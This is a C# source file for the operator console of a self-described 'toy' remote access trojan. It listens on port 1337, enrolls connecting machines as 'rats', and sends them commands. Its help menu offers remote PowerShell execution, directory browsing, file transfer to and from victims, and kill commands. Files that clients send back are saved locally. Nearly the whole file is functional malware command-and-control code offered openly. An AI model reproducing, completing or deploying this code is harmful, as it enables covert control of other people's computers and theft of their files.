using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;
using System.Diagnostics;

/** Toy R.A.T.
 * -> Sends messages to clients, called rats
 * -> Can select between communicating to one, or all clients
 * -> Can handle specific requests and messages sent from clients, e.g. File transfer  
 */

namespace da_pak
{
    class Pak
    {
        /* Global values */
        private static string _localPath = Directory.GetCurrentDirectory(); 
        private static byte[] _buffer = new byte[2048];

        private static List<Socket> _clientSockets = new List<Socket>();
        private static List<Rat> _rats = new List<Rat>();
        private static Socket _serverSocket = new Socket
            (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        
        /* Personailzed Output */
        private static void puts(string text, bool prefix = true)
        {
            Console.WriteLine(text);
            if (prefix) Console.Write("> ");
        } private static void puts(){ puts(""); }


        /** Client
         * -> hostSock          clients' socket
         * -> hostName          - " - local user@machine
         * -> hostAddr          - " - ipv4 address
         *
         * -> ratN              rat number -> static counter
         * -> selected          is the user explicitly selecting this client ?
         */
        private class Rat
        {
            public Socket hostSock;
            private string hostName;
            private string hostAddr;

            private static int n = 0;
            public bool selected = false;
            public int ratN;

            public Rat(Socket sock, string info)
            {
                /* infoStructure: `INFO user@machine localIP` */
                string[] infoArr = info.Split();                
                hostName = infoArr[1];
                hostAddr = infoArr[2];

                hostSock = sock;

                ratN = n;
                n += 1;
            }

            public static Rat getRatBySock(Socket sok)
            {
                foreach (var rat in _rats)
                    if (sok == rat.hostSock)
                        return rat;
                return null;
            }

            /* Personalized Output -> ```Rat[number]: text``` */
            public static string daRatSays(string message, Rat rat)
            {
                return "Rat[" + rat.ratN + "]: " + message;
            } 
            public static string daRatSays(string message, Socket sok) { return daRatSays(message, getRatBySock(sok)); }

            public override string ToString()
            {
                /*> Rat no.0: hostName on hostAddr */
                return "[" + selected + "] Rat no." + ratN + ": " + hostName + " on " + hostAddr;
            }
        }

        /* That magical place... */
        static void Main(string[] args)
        {
            Console.Title = "Pak";

            SetupServer();
            SendLoop();

            Console.WriteLine("Exiting...");
        }


        /* Connect to localhost and start accepting requests */
        private static void SetupServer()
        {
            Console.WriteLine("Setting up server...");
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, 1337));
            
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        /* Continue accepting requests, and open the connection to the prev. accepted socket */
        private static void AcceptCallback(IAsyncResult AR)
        {
            Socket socket = _serverSocket.EndAccept(AR);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);

            _clientSockets.Add(socket);
            puts("Client connected...");

            socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;

            try
            {
                if (socket.Connected)
                {
                    int received = socket.EndReceive(AR);

                    byte[] dataBuf = new byte[received];
                    Array.Copy(_buffer, dataBuf, received);

                    string text = Encoding.ASCII.GetString(dataBuf);
                    
                    /* HANDLE REQUESTS */
                    /** If the client sends a message with the info. header,
                     * then add him to the known clients; where
                     *      infoHeader: `INFO hostName hostAddr`
                     */
                    string response = string.Empty;
                    if (text.ToLower().Split()[0] == "info")
                    {
                        _rats.Add( new Rat(socket, text) );
                        response = "INFO Rat added to the pak";
                        SendMessage(response, socket);
                    }

                    /* Check for a file header with a non-empty message, where
                     *  File header: `FILE fileName headerSize textString`                 */
                    if (text.ToLower().Split()[0] == "file" && text.ToLower().Split()[2] != "0")
                    {
                        string fileName = text.ToLower().Split()[1]; 
                        int headerSize = Convert.ToInt32(text.ToLower().Split()[2]);
                        
                        string filePath = Directory.GetCurrentDirectory() + "\\" + fileName;

                        /* Remove the the header from the message */
                        text = text.Remove(0, headerSize);

                        File.WriteAllText( @filePath, text );
                        // puts( "Wrote: " + text );

                        text = fileName + " was downloaded locally @ " + filePath;
                    }
                    
                    puts( Rat.daRatSays(text, socket) );

                    socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
                }
            }

            /* Handle the case of a socket suddenly disconnecting.
             * *might catch other sokcetExceptions at the time of disconnecting... */
            catch (SocketException)
            {
                puts("Client disconnected...");

                socket.Close();
                _clientSockets.Remove(socket);

                Rat toBeRemoved = null;
                foreach (var rat in _rats)
                    if (socket == rat.hostSock)
                        toBeRemoved = rat;
                if (_rats.Contains(toBeRemoved)) _rats.Remove(toBeRemoved);

                _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
            }
        }

        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

        /* message -> byteArray -> (send to) sok */
        private static void SendMessage(string message, Socket sok)
        {
            byte[] data = Encoding.ASCII.GetBytes(message);
            sok.BeginSend(data, 0, data.Length, SocketFlags.None,
                                new AsyncCallback(SendCallback), sok);
            
            sok.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                                new AsyncCallback(ReceiveCallback), sok);
        }
        private static void SendMessage(string message, Rat rat) { SendMessage(message, rat.hostSock); }

        private static string _help = @"
               __    __          
____________ _/  |__/  |_ ___.__.
\_  __ \__  \\   __\   __<   |  |
 |  | \// __ \|  |  |  |  \___  |
 |__|  (____  /__|  |__|  / ____|
            \/            \/     
_________________________________
__________  _____   ____  __.    
\______   \/  _  \ |    |/ _|    
 |     ___/  /_\  \|      <      
 |    |  /    |    \    |  \     
 |____|  \____|__  /____|__ \    
                 \/        \/    
Commands:

    list `or` rats          display rats

    rat {no}                select a rat to broadcast to
    rat                     deselect rat (broadcast to / select all)

    dir                     display directory of the selected rat(s)
    cd {dir}                navigate the directory of the selected rat(s)

    cmd                     execute a command via powershell (rat-slide)

    upload {fileName}       upload a localFile to the selected rat(s) (tbi.)
    download {fileName}     download a file from the selected rat(s) (tbi.)

    kill                    send terminate command to the selected rat(s)

    help                    display help

    break `or` exit         exit

";
        private static void SendLoop()
        {
            /* theChosenOne = the selected client */
            Rat theChosenOne = null;
            while(true)
            {
                Console.Write("> ");
                string input = Console.ReadLine().Trim();

                if (input == "break" || input == "exit")
                    break;

                else if (input == "help")
                    Console.Write(_help);

                else if (input == "list" || input == "rats")
                    foreach(var rat in _rats)
                        Console.WriteLine(rat);

                else if (input.Split()[0] == "rat" && input.Split().Length < 3 && _rats.Count >= 1)
                {
                    if ( input.Split().Length == 1 )
                    {
                        theChosenOne.selected = false;
                        theChosenOne = null;
                    }
                    else if ( Convert.ToInt32(input.Split()[1]) < _rats.Count)
                    {
                        theChosenOne = _rats[ Convert.ToInt32( input.Split()[1]) ];
                        theChosenOne.selected = true;
                    }
                    else
                        puts("Rat not found");
                }

                else if (input.Split()[0] == "upload")
                {
                    if (input.Split().Length == 1 || input.Split().Length > 2)
                        puts("Invalid input");
                    
                    /* Check if file exists, append the FILE header and send the message */
                    if (DoesFileExist(input.Split()[1]))
                    {
                        string response = "FILE " + input.Split()[1] + " ";
                        response += FileToString(input.Split()[1]);
                        
                        if (theChosenOne == null)
                            foreach(var rat in _rats)
                                SendMessage(response, rat);

                        else
                            SendMessage(response, theChosenOne);
                    }
                        
                    else
                        puts("Could not find: " + input.Split()[1]);
                }

                else
                {
                    /* Send message to either only one or to all rats */
                    if (theChosenOne == null)
                        foreach(var rat in _rats)
                            SendMessage(input, rat);

                    else
                    {
                        SendMessage(input, theChosenOne);

                        /* Nuke'em */
                        if (input == "kill" || input == "black_plague" || input == "terminate")
                            theChosenOne = null;
                    }

                    /* Seppuku */
                    if (input == "black_plague" || input == "terminate")
                        Environment.Exit(0);
                }
            }
        }

        public static bool DoesFileExist(string file)
        {
            List<string> fils = new List<string>( Directory.EnumerateFiles( _localPath ));
            
            foreach (var fil in fils)
                if (file == fil.Remove(0, _localPath.Length+1))
                    return true;

            return false;
        }

        public static string FileToString(string file)
        {
            /* headerSize ... */
            if (DoesFileExist(file))
                return (5 + file.Length + 3).ToString() + " " + File.ReadAllText(_localPath + "\\" + file);
            
            return "0 empty";
        }
    }
}
